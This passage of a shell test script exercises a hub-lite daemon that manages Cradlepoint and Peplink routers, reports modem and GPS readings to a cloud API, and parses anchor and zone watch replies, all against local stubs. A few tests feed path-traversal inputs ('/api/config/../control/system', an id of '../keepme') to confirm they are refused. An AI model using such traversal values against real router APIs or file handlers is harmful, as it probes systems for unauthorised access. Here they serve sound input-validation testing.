check "cp add: the store is root-only (600)" "600" "$(ls -l "$RCONF" | awk '{ print $1 }' | sed 's/^-rw-------.*/600/')"
check "cp add: the password never reached the world-readable conf" "0" "$(grep -c 'cret' "$T/conf")"
check "cp add: the log says what happened and nothing secret" "1 0" "$(grep -c "cradlepoint 'CBA850' at 127.0.0.1 added (gps on)" "$RLOG") $(grep -c 'cret\|aaaaaaaa' "$RLOG")"
r=$(rapi POST /routers '{"action":"add","id":"brv_net_cp2","host":"127.0.0.1","gpsEnabled":true,"password":"x"}')
check "cp add: gps on needs the brv_gps_ record" "422" "$(status_of "$r")"
r=$(rapi POST /routers '{"action":"add","id":"brv_net_cp2","host":"127.0.0.1"}')
check "cp add: a new router needs its admin password" "422 the router's admin password is required" "$(status_of "$r") $(body_of "$r" | sed -n 's/.*"error":"\(.*\)"}.*/\1/p')"
r=$(rapi GET /status "")
check "routers door: /status and GET agree, and neither carries a secret" "1 0" "$(body_of "$r" | grep -c '"routers":\[{"id":"brv_net_cp1"') $(body_of "$r" | grep -c 'cret\|aaaaaaaa')"

: > "$RS/log"
r=$(rapi POST /routers '{"action":"apn","id":"brv_net_cp1"}')
check "cp apn read: rule 4's manual static APN" '200 {"mode":"manual","apn":"mw01.VZWSTATIC"}' "$(status_of "$r") $(body_of "$r")"
: > "$RS/log"
r=$(rapi POST /routers '{"action":"apn","id":"brv_net_cp1","mode":"manual","apn":"vzwinternet"}')
check "cp apn manual: the answer is what the router now holds" '200 {"mode":"manual","apn":"vzwinternet"}' "$(status_of "$r") $(body_of "$r")"
check "cp apn manual: one PUT per LEAF, name FIRST, never the modem object" \
  "PUT /api/config/wan/rules2/4/modem/manual_apn data=%22vzwinternet%22,PUT /api/config/wan/rules2/4/modem/apn_mode data=%22manual%22" \
  "$(grep '^PUT' "$RS/log" | awk -F'|' '{ print $1 " " $3 }' | paste -sd, -)"
: > "$RS/log"
r=$(rapi POST /routers '{"action":"apn","id":"brv_net_cp1","mode":"auto"}')
check "cp apn auto: written as NCOS's default, answered as auto" '200 {"mode":"auto"} PUT /api/config/wan/rules2/4/modem/apn_mode data=%22default%22' \
  "$(status_of "$r") $(body_of "$r") $(grep '^PUT' "$RS/log" | awk -F'|' '{ print $1 " " $3 }' | paste -sd, -)"
r=$(rapi POST /routers '{"action":"apn","id":"brv_net_cp1","mode":"manual","apn":"  "}')
check "cp apn manual: no name is refused before any write" "502 0" "$(status_of "$r") $(grep -c 'manual_apn.*data=%22%20' "$RS/log")"
r=$(rapi POST /routers '{"action":"apn","id":"brv_net_cp1","mode":"sideways"}')
check "cp apn: mode must be auto or manual" "422" "$(status_of "$r")"
r=$(rapi POST /routers '{"action":"read","id":"brv_net_cp1","path":"/api/config/system/admin"}')
check "cp read: scrubbed" '{"path":"/api/config/system/admin","data":{"username":"admin","password":"•••"}}' "$(body_of "$r")"
r=$(rapi POST /routers '{"action":"read","id":"brv_net_cp1","path":"/api/control/system"}')
check "cp read: a control path is refused" "422" "$(status_of "$r")"
r=$(rapi POST /routers '{"action":"read","id":"brv_net_cp1","path":"/api/config/../control/system"}')
check "cp read: traversal is refused" "422" "$(status_of "$r")"
r=$(rapi POST /routers '{"action":"refresh","id":"brv_net_cp1"}')
check "cp refresh: state carries modem/wan/fix and the apn last read" "1 1 1" \
  "$(body_of "$r" | grep -c '"state":{"atMs":[0-9]*,"okAtMs":[0-9]*,"probe":{"model":"CBA850"') $(body_of "$r" | grep -c '"fix":{"lat":41.49292222') $(body_of "$r" | grep -c '"apn":{"mode":"auto"}')"
r=$(rapi POST /routers '{"action":"refresh","id":"nope"}')
check "cp refresh: unknown id is 404" "404" "$(status_of "$r")"
r=$(rapi POST /routers '{"action":"password","id":"brv_net_cp1","password":"wrong"}')
check "cp password: a new credential is PROVED first — a wrong one is 502 and the stored one survives" "502 1" \
  "$(status_of "$r") $(grep -c 's"e\\cret' "$RCONF")"
r=$(rapi POST /routers '{"action":"reboot","id":"brv_net_cp1"}')
check "cp reboot" '200 {"ok":true}' "$(status_of "$r") $(body_of "$r")"

# Reporting: as the ROUTER through send_event, the fix as the brv_gps_ device through the spool —
# and a command queued for the router in the reply never runs on this hub-lite.
: > "$T/rt.urls"; : > "$T/rt.ran"; rm -f "$T/rt.spool"
(
  # The REAL send_event, not the recorder the anchor tests above left in this shell.
  # shellcheck disable=SC1091
  . "$HL_DIR/brvg-hub-lite.sh"
  BRVG_HUB_LITE_ROUTERS_CONF="$RCONF"; RT_CONF="$RCONF"; RT_DIR="$RDIR"; BRVG_RT_LOG="$RLOG"; BRVG_RELAY_SPOOL="$T/rt.spool"
  VID=v_test; WORKER_URL=https://api.example.test; DEVICE_ID=brv_net_hublite; DEVICE_TOKEN=hubtok_0123456789abcdef; PENDING_ACK=""
  curl() { if [ "$1" = "-K" ]; then command curl "$@"; else eval "echo \"\${$#}\"" >> "$T/rt.urls"; printf '%s' '{"commands":[{"id":"c9","cmd":"reboot"}]}'; fi; }
  run_commands() { echo "RAN $1" >> "$T/rt.ran"; }
  rm -f "$RDIR/brv_net_cp1.ctr" "$RDIR/brv_net_cp1.sent" "$RDIR/brv_net_cp1.gpssent" "$RDIR/cadence"
  ( rt_load brv_net_cp1 && rt_poll_report )
  ( rt_load brv_net_cp1 && rt_poll_report )
  grep -c 'event=modem.measurement' "$T/rt.urls" > "$T/rt.n2"
  wc -l < "$T/rt.spool" | tr -d ' ' >> "$T/rt.n2"
  # A member starts watching: the main loop's check-in writes a 60 s cadence, and the last report is older.
  echo 60 > "$RDIR/cadence"; echo $(( $(date +%s) - 90 )) > "$RDIR/brv_net_cp1.sent"
  # The poll child inherits the main loop's lease state (rt_tick forks it).
  LIVE_LEASE=1; LIVE_UNTIL=$(( $(date +%s) + 300 ))
  ( rt_load brv_net_cp1 && rt_poll_report )
  echo "$DEVICE_ID $DEVICE_TOKEN ack=$PENDING_ACK" > "$T/rt.after"
)
check "report (0.17.0): the second poll inside the check-in cadence sends NO modem report and spools no unmoved fix" "1
1" "$(cat "$T/rt.n2")"
check "report: modem.measurement goes AS the router, with the router's own token — nobody watching, STATE only (0.18.2)" "1" \
  "$(grep -c '^https://api.example.test/api/hub-lite?vid=v_test&device=brv_net_cp1&event=modem.measurement&t=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&up=1&mode=LTE&carrier=Verizon&sim=ok&dataMb=1&wan=lte&ip=100.64.3.9&model=CBA850&fw=7.0.50&av=hub-lite-[0-9.]*$' "$T/rt.urls")"
check "report: while a member watches, the router's whole reading goes, signal included (0.18.2)" "1" \
  "$(grep -c '^https://api.example.test/api/hub-lite?vid=v_test&device=brv_net_cp1&event=modem.measurement&t=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&up=1&mode=LTE&rssi=-71&rsrp=-101&sinr=7.4&rsrq=-12&carrier=Verizon&sim=ok&dataMb=1&wan=lte&ip=100.64.3.9&model=CBA850&fw=7.0.50&av=hub-lite-[0-9.]*$' "$T/rt.urls")"
check "report: the router's LAN snapshot still holds its signal (only the wire copy is trimmed)" "1" "$(grep -c '^m\.rsrp	-101$' "$RDIR/brv_net_cp1.snap")"
check "report: a command queued for the ROUTER never runs on the hub-lite" "0" "$(wc -l < "$T/rt.ran" | tr -d ' ')"
check "report: the hub-lite's own identity and ack list are untouched" "brv_net_hublite hubtok_0123456789abcdef ack=" "$(cat "$T/rt.after")"
check "report: the first poll has no plan-burn baseline, the second a zero delta sends none" "0" "$(grep -c wanKb_cellular "$T/rt.urls")"
check "report: the fix is spooled as the brv_gps_ device" "brv_gps_cp1	gps.measurement	lat=41.492922&lon=-81.694306&acc=5.0" "$(head -n 1 "$T/rt.spool" | cut -f2-)"
check "report: the loop is asked to drain" "yes" "$([ -f "$RDIR/drain" ] && echo yes || echo no)"
check "report: no secret in any log line" "0" "$(grep -c 'cret\|aaaaaaaa' "$RLOG")"

# 0.18.1 poll grace on a managed router: rt_graced with injected times, the stub router's real
# snapshot as the good reading, a failed poll as rt_poll leaves it (snapshot kept, RT_ERR set), and a
# down read as the snapshot with the modem not connected.
RG="$T/rgrace"; mkdir -p "$RG"; cp "$RDIR/brv_net_cp1.snap" "$RG/good.snap"
(
  # shellcheck disable=SC1091
  . "$HL_DIR/brvg-hub-lite.sh"
  RT_CONF="$RCONF"; RT_DIR="$RDIR"; BRVG_RT_LOG="$RG/log"; BRVG_RELAY_SPOOL="$RG/spool"
  VID=v_test; WORKER_URL=https://api.example.test; DEVICE_ID=brv_net_hublite; DEVICE_TOKEN=hubtok_0123456789abcdef; PENDING_ACK=""
  curl() { eval "echo \"\${$#}\"" | sed 's/.*&event=modem.measurement&t=[a-z]*&//' >> "$RG/sent"; printf '{}'; }
  : > "$RG/log"; : > "$RG/sent"
  rm -f "$RDIR/brv_net_cp1.grace" "$RDIR/brv_net_cp1.good" "$RDIR/brv_net_cp1.sent" "$RDIR/brv_net_cp1.ctr" "$RDIR/cadence"
  rt_load brv_net_cp1
  n() { printf '%s sent=%s logs=%s' "$1" "$(wc -l < "$RG/sent" | tr -d ' ')" "$(wc -l < "$RG/log" | tr -d ' ')"; }
  fail() { RT_ERR="the router did not answer (timed out) — is the hub on the same network?"; rt_graced 0 "$1" "$2"; }
  good() { cp "$RG/good.snap" "$RDIR/brv_net_cp1.snap"; rt_graced 1 "$1" "$2"; }
  downread() { sed 's/^m\.connected\t1$/m.connected\t0/' "$RG/good.snap" | grep -v '^m\.connected' > "$RDIR/brv_net_cp1.snap"; rt_graced 1 "$1" "$2"; }

  # `quiet T` = a report was sent at T-1, so the check-in cadence sends nothing on its own at T.
  quiet() { echo $(( $1 - 1 )) > "$RDIR/brv_net_cp1.sent"; }
  good 1000 1001; n good > "$RG/out"; echo >> "$RG/out"
  # The check-in cadence says a report is due, so the grace's report shows what it reports.
  echo 0 > "$RDIR/brv_net_cp1.sent"
  fail 2000 2015; n fail1 >> "$RG/out"; echo >> "$RG/out"
  echo " due=$(cat "$RDIR/brv_net_cp1.due") grace=$(cat "$RDIR/brv_net_cp1.grace")" >> "$RG/out"
  quiet 2020; good 2020 2021; n recovered-quietly >> "$RG/out"; echo " grace=$(cat "$RDIR/brv_net_cp1.grace" 2>/dev/null)" >> "$RG/out"
  quiet 3000; fail 3000 3001; quiet 3044; fail 3044 3045; n fail44 >> "$RG/out"; echo >> "$RG/out"
  quiet 3045; fail 3045 3060; n fail45 >> "$RG/out"; echo >> "$RG/out"
  quiet 3120; fail 3120 3121; n still >> "$RG/out"; echo >> "$RG/out"
  quiet 3200; good 3200 3201; n up >> "$RG/out"; echo >> "$RG/out"
  quiet 3300; good 3300 3301; n next-good >> "$RG/out"; echo >> "$RG/out"
  echo 0 > "$RDIR/brv_net_cp1.sent"
  downread 4000 4001; n down1 >> "$RG/out"; echo >> "$RG/out"
  quiet 4045; downread 4045 4046; n down45 >> "$RG/out"; echo >> "$RG/out"
)
RGGOOD=$(sed -n 1p "$RG/sent")
check "router grace: the good reading is reported — STATE only, nobody is watching (0.18.2)" "1|0" \
  "$(printf '%s' "$RGGOOD" | grep -c "^up=1&mode=LTE&carrier=Verizon&.*&av=hub-lite-$(printf '%s' "$HUB_LITE_VERSION" | sed 's/\./\\./g')$")|$(printf '%s' "$RGGOOD" | grep -c 'rssi\|rsrp\|rsrq\|sinr')"
check "router grace: ONE failed poll — the LAST GOOD reading, unchanged, is what the due report sends; nothing logged" \
  "fail1 sent=2 logs=0|$RGGOOD" "$(sed -n 2p "$RG/out")|$(sed -n 2p "$RG/sent")"
check "router grace: the failed poll is retried 5 s after it failed, and the window starts at its start" " due=2020 grace=2000 1 0" "$(sed -n 3p "$RG/out")"
check "router grace: a good poll inside the grace resets it quietly" "recovered-quietly sent=2 logs=0 grace=" "$(sed -n 4p "$RG/out")"
check "router grace: failing for 44 s reports nothing down and logs nothing" "fail44 sent=2 logs=0" "$(sed -n 5p "$RG/out")"
check "router grace: 45 s continuous is DOWN at once (off-cadence), with ONE log line" "fail45 sent=3 logs=1" "$(sed -n 6p "$RG/out")"
check "router grace: the down report is the last good reading with up=0" "up=0${RGGOOD#up=1}" "$(sed -n 3p "$RG/sent")"
check "router grace: the down log line names the reason" "1" "$(grep -c "^routers: 127.0.0.1 'CBA850' - no answer for 45s - reporting it down (the router did not answer (timed out)" "$RG/log")"
check "router grace: still failing after down sends nothing inside the cadence and logs nothing" "still sent=3 logs=1" "$(sed -n 7p "$RG/out")"
check "router grace: the first good poll after down is UP at once, with one 'reachable again'" "up sent=4 logs=2|$RGGOOD|1" \
  "$(sed -n 8p "$RG/out")|$(sed -n 4p "$RG/sent")|$(grep -c "reachable again" "$RG/log")"
check "router grace: the next good poll is ordinary — no send inside the cadence, no log" "next-good sent=4 logs=2" "$(sed -n 9p "$RG/out")"
check "router grace: ONE down READ sends no up=0 (the due report is the last good reading)" "down1 sent=5 logs=2|$RGGOOD" \
  "$(sed -n 10p "$RG/out")|$(sed -n 5p "$RG/sent")"
check "router grace: 45 s of down READS reports down at once — the read itself, up=0 — with one log line" "down45 sent=6 logs=3|1|1" \
  "$(sed -n 11p "$RG/out")|$(sed -n 6p "$RG/sent" | grep -c '^up=0&mode=LTE&carrier=Verizon&')|$(grep -c "uplink down for 45s - reporting it down" "$RG/log")"
check "router grace: the failure reason is logged ONCE, on the down line — never per failed poll (5 failed polls here)" "1" "$(grep -c 'did not answer' "$RG/log")"
rm -f "$RDIR/brv_net_cp1.grace" "$RDIR/brv_net_cp1.good" "$RDIR/brv_net_cp1.due"
cp "$RG/good.snap" "$RDIR/brv_net_cp1.snap"

# End to end through rt_poll_report: a router that refuses the connection is ONE failed poll — no
# report, no log, and its due time moved to 5 s after the failure (between the poll's start + 5 and
# its end + 5, whatever the clock did in between).
(
  # shellcheck disable=SC1091
  . "$HL_DIR/brvg-hub-lite.sh"
  RT_CONF="$RCONF"; RT_DIR="$RDIR"; BRVG_RT_LOG="$RG/log3"; BRVG_RELAY_SPOOL="$RG/spool3"
  VID=v_test; WORKER_URL=https://api.example.test; DEVICE_ID=brv_net_hublite; DEVICE_TOKEN=hubtok_0123456789abcdef
  curl() { if [ "$1" = "-K" ]; then command curl "$@"; else echo sent >> "$RG/sent3"; printf '{}'; fi; }
  : > "$RG/log3"; : > "$RG/sent3"; echo 0 > "$RDIR/brv_net_cp1.sent"
  _s=$(date +%s)
  ( rt_load brv_net_cp1 && RT_HOST=127.0.0.1 && RT_PORT=1 && rt_poll_report )
  _e=$(date +%s); _d=$(cat "$RDIR/brv_net_cp1.due")
  echo "$([ "$_d" -ge $(( _s + 5 )) ] && [ "$_d" -le $(( _e + 5 )) ] && echo retry-5s) $(cut -d' ' -f2,3 "$RDIR/brv_net_cp1.grace") sent=$(wc -l < "$RG/sent3" | tr -d ' ') logs=$(wc -l < "$RG/log3" | tr -d ' ')" > "$RG/e2e"
  # The loop's nap sees the retry: rt_next_due is the soonest enabled router's due time.
  echo $(( _e + 3 )) > "$RDIR/brv_net_cp1.due"; rm -f "$RDIR/brv_net_cp1.pid"
  echo "next=$(( $(rt_next_due "$_e") - _e ))" >> "$RG/e2e"
  sleep 60 & echo $! > "$RDIR/brv_net_cp1.pid"; echo $(( _e + 100 )) > "$RDIR/brv_net_cp1.due"
  echo "running=$(( $(rt_next_due "$_e") - _e ))" >> "$RG/e2e"
  kill "$(cat "$RDIR/brv_net_cp1.pid")" 2>/dev/null; rm -f "$RDIR/brv_net_cp1.pid"
)
check "router grace e2e: one refused connection — retry due in 5 s, one bad sample, no report, no log" "retry-5s 1 0 sent=0 logs=0" "$(sed -n 1p "$RG/e2e")"
check "router grace e2e: rt_next_due hands the loop the router's due time" "next=3" "$(sed -n 2p "$RG/e2e")"
check "router grace e2e: while a read is running the loop naps at most 5 s (it may move its due earlier)" "running=5" "$(sed -n 3p "$RG/e2e")"
rm -f "$RDIR/brv_net_cp1.grace" "$RDIR/brv_net_cp1.good" "$RDIR/brv_net_cp1.due" "$RDIR/brv_net_cp1.sent"
cp "$RG/good.snap" "$RDIR/brv_net_cp1.snap"

# The raised background-poll timeouts are what curl is given; the interactive door keeps its own.
(
  # shellcheck disable=SC1091
  . "$HL_DIR/brvg-hub-lite.sh"
  RT_CONF="$RCONF"; RT_DIR="$RDIR"; BRVG_RT_LOG="$RG/log2"; BRVG_RELAY_SPOOL="$RG/spool2"
  VID=v_test; WORKER_URL=https://api.example.test; DEVICE_ID=brv_net_hublite; DEVICE_TOKEN=hubtok_0123456789abcdef
  curl() { if [ "$1" = "-K" ]; then tee -a "$RG/cfg.$RG_WHO" | command curl "$@"; else printf '{}'; fi; }
  rm -f "$RG"/cfg.*
  RG_WHO=poll; ( rt_load brv_net_cp1 && rt_poll_report )
  RG_WHO=door; ( rt_load brv_net_cp1 && rt_work && rt_poll; rm -rf "$RT_W" )
)
check "timeouts: the background poll gives curl max-time 30 / connect-timeout 15 on every request" "30 15" \
  "$(grep '^max-time = ' "$RG/cfg.poll" | sort -u | sed 's/.*= //' | paste -sd' ' -) $(grep '^connect-timeout = ' "$RG/cfg.poll" | sort -u | sed 's/.*= //' | paste -sd' ' -)"
check "timeouts: the interactive door (refresh's rt_poll) keeps 15 / 5" "15 5" \
  "$(grep '^max-time = ' "$RG/cfg.door" | sort -u | sed 's/.*= //' | paste -sd' ' -) $(grep '^connect-timeout = ' "$RG/cfg.door" | sort -u | sed 's/.*= //' | paste -sd' ' -)"
check "timeouts: both actually polled the stub (requests were made)" "yes" \
  "$([ "$(grep -c '^url = ' "$RG/cfg.poll")" -ge 2 ] && [ "$(grep -c '^url = ' "$RG/cfg.door")" -ge 2 ] && echo yes || echo no)"

# The loop hook: a due router is read in the BACKGROUND (never stalling the valve loop), once.
(
  RT_CONF="$RCONF"; RT_DIR="$RDIR"; BRVG_RT_LOG="$RLOG"; BRVG_RELAY_SPOOL="$T/rt.spool"; VID=v_test; WORKER_URL=https://api.example.test
  curl() { if [ "$1" = "-K" ]; then command curl "$@"; else printf '{}'; fi; }
  drain_relay() { echo drained > "$T/rt.drained"; }
  rm -f "$RDIR"/*.due "$RDIR"/*.pid "$T/rt.drained"; : > "$RDIR/drain"
  rt_tick
  _p=$(cat "$RDIR/brv_net_cp1.pid"); _n=0
  while kill -0 "$_p" 2>/dev/null && [ "$_n" -lt 100 ]; do sleep 0.1; _n=$((_n + 1)); done
  _d1=$(cat "$RDIR/brv_net_cp1.due")
  rt_tick
  echo "$(cat "$T/rt.drained" 2>/dev/null) $([ "$_d1" -gt "$(date +%s)" ] && echo due-later) $([ "$(cat "$RDIR/brv_net_cp1.due")" = "$_d1" ] && echo not-repolled)" > "$T/rt.tick"
)
check "tick: drains when asked, schedules by due time, does not re-poll early" "drained due-later not-repolled" "$(cat "$T/rt.tick")"

: > "$RS/log"
r=$(rapi POST /routers '{"action":"apn","id":"brv_net_pl1"}')
check "pl: unknown id before vendor rules" "404" "$(status_of "$r")"
r=$(rapi POST /routers "{\"action\":\"add\",\"id\":\"brv_net_pl1\",\"vendor\":\"peplink\",\"host\":\"127.0.0.1\",\"port\":$RP,\"username\":\"admin\",\"password\":\"wrong\"}")
check "pl sign-in REFUSED: the router's own reason, the credential nowhere" "502 the router refused the sign-in — Invalid password" \
  "$(status_of "$r") $(body_of "$r" | sed -n 's/.*"error":"\(.*\)"}.*/\1/p')"
echo 0 > "$RS/logins"; : > "$RS/log"
r=$(rapi POST /routers "{\"action\":\"add\",\"id\":\"brv_net_pl1\",\"vendor\":\"peplink\",\"host\":\"127.0.0.1\",\"port\":$RP,\"username\":\"admin\",\"password\":\"secret\"}")
check "pl add: fw 8.5 with no model endpoint still probes (#146)" "200" "$(status_of "$r")"
check "pl add: one re-login for the expired first session, then the cookie is kept" "2" "$(cat "$RS/logins")"
check "pl add: the session cookie rides every read after sign-in" "0" "$(grep '^GET' "$RS/log" | grep -vc '|bauth=s')"
check "pl add: firmware from info.firmware, named Router, Peplink capabilities" '"name":"Router"|"firmware":"8.5.5 build 5824"|"capabilities":["modem","wan","gps","signin"]' \
  "$(body_of "$r" | grep -o '"name":"Router"')|$(body_of "$r" | grep -o '"firmware":"8.5.5 build 5824"')|$(body_of "$r" | grep -o '"capabilities":\[[^]]*\]')"
for a in apn reboot read; do
  : > "$RS/log"
  r=$(rapi POST /routers "{\"action\":\"$a\",\"id\":\"brv_net_pl1\"}")
  check "pl $a: refused as unsupported BEFORE any sign-in" "422 0" "$(status_of "$r") $(wc -l < "$RS/log" | tr -d ' ')"
done
check "pl apn: the daemon's wording" "reading or setting the APN is not supported on a Peplink through the hub — use the device's own app or admin pages" \
  "$(body_of "$(rapi POST /routers '{"action":"apn","id":"brv_net_pl1"}')" | sed -n 's/.*"error":"\(.*\)"}.*/\1/p')"
: > "$RS/log"
r=$(rapi POST /routers '{"action":"gps","id":"brv_net_pl1","gpsEnabled":true,"gpsDevId":"brv_gps_pl1"}')
check "pl gps: hub-side only — no request reaches the router" "200 0" "$(status_of "$r") $(wc -l < "$RS/log" | tr -d ' ')"
r=$(rapi POST /routers '{"action":"remove","id":"brv_net_pl1"}')
check "remove" '200 {"ok":true}' "$(status_of "$r") $(body_of "$r")"
check "remove: gone from the store, and its state with it" "0 0" "$(grep -c '^brv_net_pl1' "$RCONF") $(ls "$RDIR" | grep -c '^brv_net_pl1\.')"
r=$(rapi POST /routers '{"action":"remove","id":"brv_net_pl1"}')
check "remove: twice is 404" "404" "$(status_of "$r")"
: > "$T/keepme.snap"
r=$(rapi POST /routers '{"action":"remove","id":"../keepme"}')
check "remove: an id that is a path never reaches rm" "422 yes" "$(status_of "$r") $([ -f "$T/keepme.snap" ] && echo yes || echo no)"

touch "$RS/stop"; curl -s -o /dev/null "http://127.0.0.1:$RP/stop" 2>/dev/null; kill "$RSTUB_PID" 2>/dev/null; wait "$RSTUB_PID" 2>/dev/null
fi

echo ""
echo "# --- 0.17.0: hub->cloud cadence (D6 check-in, L1-L4) ----------------------------------------"
# Every block below runs in a SUBSHELL that re-sources the hub-lite, so the stubs earlier suites left
# in this shell (send_event, log) never stand in for the real functions under test.
C17="$T/c17"; mkdir -p "$C17"
cat > "$C17/conf" <<CONF
VID="v_test"
DEVICE_ID="brv_net_test"
DEVICE_TOKEN="tok_SECRET_0123456789"
WORKER_URL="https://api.example.test"
MGMT_KEY=$KEY
LINKTAP_HOST=192.168.8.50
LINKTAP_GW_ID=GW02
LINKTAP_DEV_IDS=$DEV
LINKTAP_ALLOWED=1
LINKTAP_NORMAL_VOL_L=378
CONF
# A fresh hub-lite in a subshell with all its state under $C17. Usage: ( hl17; ... )
hl17() {
  # shellcheck disable=SC1091
  . "$HL_DIR/brvg-hub-lite.sh"
  CONF="$C17/conf"; . "$C17/conf"
  log() { :; }
  ANCHOR_STATE="$C17/anchor"; ANCHOR_ALERTED="$C17/anchor.alerted"; ANCHOR_WARNED="$C17/anchor.warned"
  ANCHOR_STREAK="$C17/anchor.streak"; ANCHOR_WSTREAK="$C17/anchor.wstreak"
  ZONE_STATE="$C17/zone"; ZONE_ALERTED="$C17/zone.alerted"; ZONE_STREAK="$C17/zone.streak"
  HUB_LITE_GPS="$C17/gps.json"; HUB_LITE_GPS_HIT="$C17/gps.hit"; HUB_LITE_STATE="$C17/state"
  LIVE_UNTIL_FILE="$C17/live"; LIVE_PID_FILE="$C17/live.pid"; MEMBER_KEYS_FILE="$C17/keys"
  RELAY_SPOOL="$C17/spool"; BRVG_RELAY_SPOOL="$C17/spool"; RELAY_SEQ_FILE="$C17/seq"; RELAY_STATE_DIR="$C17/relay"
  RELAY_BOOT_FILE="$C17/boot"; LT_STATE_DIR="$C17/lt"; WAN_STATE_DIR="$C17/wan"; HUB_LITE_UPDATE="$C17/update"
  GPS_INTERVAL=120; MODEM_INTERVAL=600; GPS_DEADBAND_M=50; AT_PORT=/nonexistent/at
  rm -f "$ANCHOR_STATE" "$ZONE_STATE" "$C17"/*.streak "$C17"/*.alerted "$C17/spool" "$C17/live"
}
# A curl stand-in for /api/hub-lite sends: logs the URL, answers with $C17/reply (a file, so a test can change it).
agent_curl() { eval "echo \"\${$#}\"" >> "$C17/urls"; cat "$C17/reply" 2>/dev/null; }

# --- the flat v2 `anchor` object: the shared fixture's three cases, plus a zone-only arm ---
FX_ARMED='{"status":"ok","anchor":{"sig":1757750400000,"lat":41.492907,"lon":-81.694361,"radiusM":60,"warnM":45,"hbSec":300,"sampleSec":30}}'
FX_DISARM='{"status":"ok","anchor":{"sig":0}}'
FX_EXTRAS='{"status":"ok","anchor":{"sig":3515501400000,"lat":41.492907,"lon":-81.694361,"radiusM":60,"warnM":45,"zoneCy":41.4929,"zoneCx":-81.6944,"zoneR":40,"zoneStreak":3,"hbSec":300,"sampleSec":30}}'
FX_ZONE='{"status":"ok","anchor":{"sig":1757751000000,"zoneCy":41.4929,"zoneCx":-81.6944,"zoneR":40,"zoneStreak":3,"hbSec":300,"sampleSec":30},"lease":0,"leaseUntil":0,"checkinSec":900,"live":0}'
check "fixture v2 armed: hubLiteParse" "1757750400000 41.492907 -81.694361 60 45" "$(printf '%s' "$FX_ARMED" | parse_anchor)"
check "fixture v2 armed: no zone" "" "$(printf '%s' "$FX_ARMED" | parse_zone)"
check "fixture v2 disarm: hubLiteParse" "0" "$(printf '%s' "$FX_DISARM" | parse_anchor)"
check "fixture v2-flat-extras: the base keys still parse (hubLiteParse)" "3515501400000 41.492907 -81.694361 60 45" "$(printf '%s' "$FX_EXTRAS" | parse_anchor)"
check "fixture v2-flat-extras: and the zone keys parse" "3515501400000 41.4929 -81.6944 40 3" "$(printf '%s' "$FX_EXTRAS" | parse_zone)"
check "zone-only arm: no anchor line, a zone line" "|1757751000000 41.4929 -81.6944 40 3" "$(printf '%s' "$FX_ZONE" | parse_anchor)|$(printf '%s' "$FX_ZONE" | parse_zone)"
(
  hl17
  apply_watch "$(printf '%s' "$FX_ZONE" | parse_anchor)" "$(printf '%s' "$FX_ZONE" | parse_zone)"
  echo "zoneonly=$(anchor_sig) anchorfile=$([ -f "$ANCHOR_STATE" ] && echo y || echo n)" > "$C17/w"
  apply_watch "$(printf '%s' "$FX_EXTRAS" | parse_anchor)" "$(printf '%s' "$FX_EXTRAS" | parse_zone)"
  echo "both=$(anchor_sig) zone=$(cut -d' ' -f1 "$ZONE_STATE")" >> "$C17/w"
  apply_watch "$(printf '%s' "$FX_ARMED" | parse_anchor)" ""
  echo "anchoronly=$(anchor_sig) zonefile=$([ -f "$ZONE_STATE" ] && echo y || echo n)" >> "$C17/w"
  apply_watch 0 ""
  echo "disarm=$(anchor_sig) final=$GPS_FORCE_NEXT" >> "$C17/w"
)
check "watch: a zone-only arm is echoed as its own signature" "zoneonly=1757751000000 anchorfile=n" "$(sed -n 1p "$C17/w")"
check "watch: anchor + zone run under the one summed signature" "both=3515501400000 zone=3515501400000" "$(sed -n 2p "$C17/w")"
check "watch: an armed reply without zone keys takes the zone down" "anchoronly=1757750400000 zonefile=n" "$(sed -n 3p "$C17/w")"
check "watch: the disarm clears both and asks for one final position" "disarm=0 final=1" "$(sed -n 4p "$C17/w")"

# --- zone streak of 3, with the quality gate ---
(
  hl17
  send_event() { echo "$1 $2" >> "$C17/zsent"; }
  rm -f "$C17/zsent"
  apply_watch "" "7 41.4086 -81.7494 40 3"
  check_zone 41.4095 -81.7494 5 0; check_zone 41.4095 -81.7494 5 0
  echo "two=$(cat "$C17/zsent" 2>/dev/null | wc -l | tr -d ' ') out=$ZONE_OUT d=$ZONE_D" > "$C17/z"
  check_zone 41.4095 -81.7494 5 1
  echo "unreliable=$(cat "$ZONE_STREAK")" >> "$C17/z"
  check_zone 41.4095 -81.7494 5 0
  echo "three=$(cat "$C17/zsent")" >> "$C17/z"
  check_zone 41.4095 -81.7494 5 0
  echo "latched=$(wc -l < "$C17/zsent" | tr -d ' ')" >> "$C17/z"
  check_zone 41.4086 -81.7494 5 0
  echo "back=$([ -f "$ZONE_ALERTED" ] && echo latched || echo clear) streak=$(cat "$ZONE_STREAK" 2>/dev/null)" >> "$C17/z"
)
check "zone: two breaching samples fire nothing (streak 3, not the anchor's 2)" "two=0 out=1 d=100" "$(sed -n 1p "$C17/z")"
check "zone: an UNRELIABLE sample neither advances nor clears the streak" "unreliable=2" "$(sed -n 2p "$C17/z")"
check "zone: the third reliable breach fires zone.motion (the cloud sweep's own event)" "three=zone.motion dist=100&limit=40" "$(sed -n 3p "$C17/z")"
check "zone: latched for the episode" "latched=1" "$(sed -n 4p "$C17/z")"
check "zone: back inside ends the episode" "back=clear streak=" "$(sed -n 5p "$C17/z")"

# --- fix quality ---
check "quality: AT+QGPSLOC sats, hdop, knots" "9 1.2 0" "$(printf '+QGPSLOC: 061951.000,29.97580,-95.36047,1.2,32.5,2,0.00,0.0,0.0,110824,09\r\nOK\r\n' | parse_qgpsloc_quality)"
check "quality: NMEA sats/hdop from GGA, SOG from RMC" "8 0.9 0.958" \
  "$(printf '$GPGGA,123519,4807.038,N,01131.000,E,1,08,0.9,545.4,M,46.9,M,,*47\r\n$GPRMC,025433.00,A,4124.50743,N,08144.98471,W,0.958,,140826,,,A*60\r\n' | parse_nmea_quality)"
check "quality: a source that says nothing is unknown, not zero" "- - -" "$(printf 'garbage\n' | parse_nmea_quality)"
check "quality: gpsd TPV speed m/s -> knots" "- - 3.9" "$(printf '{"class":"TPV","mode":3,"lat":1.5,"lon":2.5,"speed":2.0}\n' | parse_gpsd_quality)"
check "sample: joined, with - for a missing accuracy" "41.40846 -81.74975 - 8 0.9 0.958" "$(gps_join "41.40846 -81.74975" "8 0.9 0.958")"
check "sample: no position is no sample" "" "$(gps_join "" "8 0.9 1")"
check "gate: a good fix is reliable" "0" "$(gps_unreliable 1 9 0.9 0 30)"
check "gate: hdop > 5 is unreliable" "1" "$(gps_unreliable 1 9 5.5 0 30)"
